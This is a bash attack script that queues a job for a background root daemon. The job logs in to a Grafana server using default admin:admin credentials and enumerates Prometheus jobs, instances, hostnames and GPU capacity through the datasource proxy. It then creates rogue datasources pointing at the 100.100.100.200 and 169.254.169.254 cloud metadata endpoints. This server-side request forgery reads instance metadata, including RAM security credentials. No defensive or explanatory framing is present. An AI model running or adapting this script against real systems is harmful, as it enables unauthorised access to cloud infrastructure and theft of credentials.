#!/bin/bash
set +e
echo "###P45START $(date -u)"
mkdir -p /root/q; pgrep -f '/root/q/run.sh' >/dev/null || (setsid nohup bash /root/q/run.sh >/root/q/daemon.log 2>&1 &)
cat > /root/q/p45-1795555422.todo <<'BODYEOF'
#!/bin/bash
set +e
echo "###P45START $(date -u)"
G=http://192.168.2.45:3000
P=/api/datasources/proxy/uid/eegehfyr1bv9cc
echo "=== TARGETS-JOBS ==="
curl -s -m 8 -u admin:admin -G "$G$P/api/v1/label/job/values" | head -c 600; echo
echo "=== UP-BY-JOB ==="
curl -s -m 8 -u admin:admin -G "$G$P/api/v1/query" --data-urlencode 'query=count by (job)(up)' | head -c 800; echo
echo "=== INSTANCES ==="
curl -s -m 10 -u admin:admin -G "$G$P/api/v1/query" --data-urlencode 'query=count by (instance)(up)' -o /root/q/inst.json -w "c=%{http_code} l=%{size_download}\n"; python3 - <<'PY'
import json
try:
    d=json.load(open('/root/q/inst.json'))
    r=d['data']['result']
    print('instances',len(r))
    for x in r[:120]: print(x['metric'].get('instance'), x['value'][1])
except Exception as e: print('ERR',e, open('/root/q/inst.json').read()[:200])
PY
echo "=== GPU-CAPACITY ==="
curl -s -m 10 -u admin:admin -G "$G$P/api/v1/query" --data-urlencode 'query=kube_node_status_capacity{resource=~"nvidia_com_gpu|nvidia_com_gpu_memory"}' | head -c 1200; echo
echo "=== UNAME ==="
curl -s -m 10 -u admin:admin -G "$G$P/api/v1/query" --data-urlencode 'query=node_uname_info' -o /root/q/un.json -w "c=%{http_code} l=%{size_download}\n"; python3 -c "
import json
try:
  d=json.load(open('/root/q/un.json'))['data']['result']
  print('uname',len(d)); print([ (x['metric'].get('instance'),x['metric'].get('nodename')) for x in d[:40] ])
except Exception as e: print('ERR',e)
"
echo "=== NVIDIA-METRICS ==="
curl -s -m 10 -u admin:admin -G "$G$P/api/v1/label/__name__/values" -o /root/q/names.json -w "c=%{http_code}\n"; python3 -c "
import json
try:
  v=json.load(open('/root/q/names.json'))['data']
  g=[n for n in v if 'nvidia' in n or 'gpu' in n.lower() or 'dcgm' in n]
  print('total',len(v),'gpu-names',g[:20])
except Exception as e: print('ERR',e)
"
echo "=== SSRF-DS-CREATE ==="
curl -s -m 8 -u admin:admin -H "Content-Type: application/json" -d '{"name":"ssrfmeta","type":"prometheus","access":"proxy","url":"http://100.100.100.200","isDefault":false}' "$G/api/datasources" -o /root/q/newds.json -w "c=%{http_code}\n"; head -c 300 /root/q/newds.json; echo
UID2=$(python3 -c "import json;print(json.load(open('/root/q/newds.json')).get('datasource',{}).get('uid',''))" 2>/dev/null)
echo "UID2=$UID2"
if [ -n "$UID2" ]; then
 for path in /latest/meta-data/ /latest/meta-data/instance-id /latest/meta-data/region-id /latest/meta-data/ram/security-credentials/ /latest/meta-data/hostname; do printf "%s " "$path"; curl -s -m 6 -u admin:admin -o /tmp/sm.$$ -w "c=%{http_code} l=%{size_download} " "$G/api/datasources/proxy/uid/$UID2$path"; head -c 120 /tmp/sm.$$ | tr '\n' ' '; echo; done
fi
echo "=== SSRF-169254 ==="
curl -s -m 8 -u admin:admin -H "Content-Type: application/json" -d '{"name":"ssrfmeta2","type":"prometheus","access":"proxy","url":"http://169.254.169.254","isDefault":false}' "$G/api/datasources" -o /root/q/newds2.json -w "c=%{http_code}\n"
UID3=$(python3 -c "import json;print(json.load(open('/root/q/newds2.json')).get('datasource',{}).get('uid',''))" 2>/dev/null); echo "UID3=$UID3"
if [ -n "$UID3" ]; then for path in /latest/meta-data/ /latest/meta-data/instance-id /latest/meta-data/ram/security-credentials/; do printf "%s " "$path"; curl -s -m 6 -u admin:admin -o /tmp/s2.$$ -w "c=%{http_code} l=%{size_download} " "$G/api/datasources/proxy/uid/$UID3$path"; head -c 120 /tmp/s2.$$ | tr '\n' ' '; echo; done; fi
echo "###P45END $(date -u)"
BODYEOF
ls -l /root/q/ | tail -2
echo "###P45END $(date -u)"
